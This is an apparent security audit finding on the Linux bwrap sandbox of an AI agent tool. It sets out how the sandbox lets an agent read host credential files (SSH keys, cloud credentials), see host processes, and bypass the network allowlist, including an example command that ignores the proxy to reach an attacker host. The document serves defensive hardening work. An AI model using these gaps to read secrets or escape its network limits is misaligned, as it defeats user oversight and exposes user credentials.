# [High] Linux bwrap configuration gaps — read-only-root leaks host secrets, no PID/IPC/user namespace, network allowlist ineffective with proxy mode

**Scope:** sandbox / Linux (bwrap) platform
**Topic:** Security — weak isolation
**Date:** 2026-04-10

## Problem

Even when bwrap is present and `applyOSSandbox` succeeds on Linux, the bwrap invocation is significantly weaker than the macOS seatbelt profile. The differences are not documented, and several of them invalidate stated guarantees.

Specific gaps, in rough priority order:

1. **`--ro-bind / /` exposes the entire host filesystem read-only to the sandboxed process.** The agent can read `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.anthropic/config.json`, `~/.gitconfig`, `~/.zhistory`, `~/.bash_history`, user browser cookies, etc. The secret-env-var filter (`secretKeyPatterns`) prevents leakage *through the environment*, but it's completely moot when the same secrets sit in files that the sandbox can `cat`. On macOS the seatbelt profile is `(allow default)` with file-write restrictions — it also allows host reads, so this is consistent behavior, but it contradicts the reviewer-context claim that the sandbox is the "primary security boundary."

2. **No `--unshare-pid`, `--unshare-ipc`, `--unshare-user`, `--unshare-uts`, `--unshare-cgroup`.** The sandboxed process is in the host's PID namespace (can `kill` other processes, can see `/proc/<host-pids>`), the host's IPC namespace (can send/receive SysV IPC, POSIX message queues, System V shared memory with the parent), and the host's user namespace (full UID identity, no privilege drop). `--proc /proc` mounts the host's /proc over it — so the sandboxed process can read `/proc/<parent>/environ`, `/proc/<parent>/mem`, `/proc/net/tcp`, etc. Full-host-visibility.

3. **Proxy mode skips `--unshare-net` entirely.** The code comment is explicit:

   ```go
   // When networkAllow is non-empty, we skip --unshare-net and rely on
   // HTTP_PROXY/HTTPS_PROXY env vars to route traffic through the allowlist
   // proxy. This is weaker than macOS seatbelt enforcement (which hard-blocks
   // non-localhost outbound). A future improvement could use iptables/nftables
   // rules inside the namespace to restrict egress to 127.0.0.1 only.
   ```

   The comment acknowledges the gap. The impact is bigger than "weaker": `HTTP_PROXY` is a convention that only well-behaved HTTP clients honor. Any sandboxed process can ignore it entirely. `curl http://attacker.com/ --noproxy '*'`, or any non-HTTP protocol (raw TCP, UDP, DNS-over-UDP, ICMP), bypasses the proxy completely. The network allowlist, on Linux in proxy mode, is a politeness convention.

4. **`--bind /tmp /tmp` is writable and shared with the host.** Anything in `/tmp` is both readable AND writable by the sandboxed process. If the host user has services reading from `/tmp` (socket files, cache files, lockfiles), the sandbox can interfere. Privilege escalation is unlikely on a single-user machine, but cross-session state leakage is real: two concurrent agent sessions share `/tmp` writability.

5. **`--dev /dev` without explicit device list.** `bwrap --dev` creates a minimal devtmpfs with `/dev/null`, `/dev/zero`, `/dev/random`, `/dev/urandom`, `/dev/tty`, `/dev/full`, and `/dev/pts`. That's fine for most things but `/dev/tty` connects the sandboxed process to the host's controlling terminal, which the agent generally should not have access to (can write to the user's terminal mid-session). Consider `--dev-bind /dev/null /dev/tty` or similar if TTY access isn't needed.

6. **No seccomp filter.** bwrap supports `--seccomp <fd>` for a custom seccomp BPF program. Nanite's invocation omits it, so all syscalls are allowed (subject to the namespace restrictions above). Even a minimal deny-list (ptrace, kernel module load, BPF, bpf, perf_event_open, userfaultfd) would materially raise the bar.

7. **No resource limits.** No `--chdir` (handled by `cmd.Dir`), but also no `--setenv` scrubbing beyond what `buildAgentEnv` produces. More importantly, no `setrlimit` on CPU, memory, fsize, or nproc. A fork bomb inside the sandbox consumes the host's process table because the PID namespace is shared. A memory hog inside the sandbox consumes host RAM until OOM killer fires on arbitrary host processes.

## Evidence

```go
// internal/sandbox/os_linux.go:18-65
func applyOSSandbox(cmd *exec.Cmd, sandboxDir string, networkAllow []string) (cleanup func(), err error) {
    bwrapPath, lookErr := exec.LookPath("bwrap")
    ...
    bwrapArgs := []string{
        "bwrap",
        "--ro-bind", "/", "/", // read-only view of entire filesystem
        "--bind", absDir, absDir, // writable sandbox directory
        "--bind", "/tmp", "/tmp", // writable tmp
        "--dev", "/dev", // minimal /dev
        "--proc", "/proc", // process introspection
    }

    // Network isolation: deny all unless networkAllow is non-empty.
    if len(networkAllow) == 0 {
        bwrapArgs = append(bwrapArgs, "--unshare-net")
    }

    bwrapArgs = append(bwrapArgs, "--die-with-parent")
    bwrapArgs = append(bwrapArgs, "--")
    ...
```

Absent flags: `--unshare-all` (or individually `--unshare-pid`, `--unshare-ipc`, `--unshare-user`, `--unshare-uts`, `--unshare-cgroup`), `--seccomp`, `--setenv`, `--cap-drop`, `--chdir`, `--file` / `--dev-bind`, resource limits.

## Impact

- **Who:** all Linux users. Gap #3 (proxy mode ineffective) affects any agent tool call with network access.
- **What:**
  - Gap #1: full-file-read of user secrets, dotfiles, SSH keys, cloud creds.
  - Gap #2: ability to observe and interfere with host processes via `/proc` and PID/IPC namespaces.
  - Gap #3: network allowlist is not enforced on Linux in proxy mode — any protocol, any destination.
  - Gap #4: cross-session state leakage via `/tmp`.
  - Gap #5: TTY access from sandboxed process.
  - Gap #6: no syscall filtering; entire kernel attack surface exposed.
  - Gap #7: resource exhaustion.
- **Release impact:** gap #3 directly contradicts a documented sandbox guarantee ("domain allowlist on outbound"). Gap #1 and #2 invalidate the sandbox as a secret-boundary. Both are beta blockers.

## Recommendation

Prioritized:

1. **Fix gap #1: limit the read-only bind.** Bind only the minimal subsystem directories needed to run interpreters. Example:

   ```
   --ro-bind /usr /usr
   --ro-bind /lib /lib
   --ro-bind /lib64 /lib64       (if present)
   --ro-bind /etc/ssl /etc/ssl
   --ro-bind /etc/resolv.conf /etc/resolv.conf
   --ro-bind /etc/hosts /etc/hosts
   --ro-bind /etc/alternatives /etc/alternatives  (Debian)
   --ro-bind /etc/nsswitch.conf /etc/nsswitch.conf
   ```

   Deliberately do NOT bind `/home`, `/root`, `/var`, `/srv`, `/opt` unless they contain something the interpreter needs. If python/node need packages from system install, bind only the site-packages directory. Start restrictive; add binds as users report missing tools.

2. **Fix gap #3: enforce network isolation at the namespace level, not via HTTP_PROXY.** Add `--unshare-net --share-net`-with-nothing trick: keep `--unshare-net`, then set up a loopback-only veth pair into the sandbox that reaches the proxy. bwrap doesn't do veth natively — standard approach is a small helper (or require the proxy to listen on an abstract unix socket that is bind-mounted in). Simplest near-term fix: keep `--unshare-net` **always**, run the proxy in the sandbox namespace via `bwrap ... --setenv HTTP_PROXY=http://127.0.0.1:PORT -- <cmd>` where the proxy is ALSO launched via a second bwrap that shares the net ns. This is fiddly; document the design before implementing.

   **Short-term mitigation:** drop proxy mode on Linux entirely for the beta. Either the caller requests "no network" (apply `--unshare-net`) or "full network" (document the risk). This is worse UX but truthful.

3. **Fix gap #2: add `--unshare-all` unless explicit override.** `--unshare-all` implies pid, ipc, user, uts, cgroup, and net. Combine with `--share-net` when network is required. This is a one-line change and matches common bwrap hardening guides.

4. **Fix gap #4: replace `--bind /tmp /tmp` with `--tmpfs /tmp`.** Each sandbox gets an ephemeral /tmp that vanishes with the process. No cross-session leakage, no host interference.

5. **Fix gap #7: add `--cap-drop ALL` and consider `setrlimit` on the parent Go process for CPU/memory before exec.** At minimum document the missing resource controls.

6. **Gap #5, #6 are lower priority but worth backlog entries.** Add a minimal seccomp filter from `libseccomp` or the `bwrap --seccomp` fd path; deny ptrace, bpf, userfaultfd, perf_event_open, kexec_load, init_module, delete_module.

7. **Cross-check with the macOS seatbelt profile** — the macOS profile is `(allow default)` minus some writes, so gap #1 (host read) exists there too. Document explicitly: "the sandbox denies host filesystem WRITES but not READS; do not place secrets on disk that the agent should not see." That's a smaller fix than closing the read path, and fits the current design better. But at minimum it should be explicit in the security docs.

## References

- `internal/sandbox/os_linux.go:18-66`
- `internal/sandbox/os_darwin.go:13-57` for comparison
- bwrap man page, `bwrap --help`
- CVE examples of bwrap-misconfig escapes are rare but gaps 2/3/4 are all documented pitfalls in bwrap hardening guides
- Related: `03-critical-linux-silent-sandbox-fallback.md`, `02-critical-proxy-ssrf-rfc1918-and-port.md`
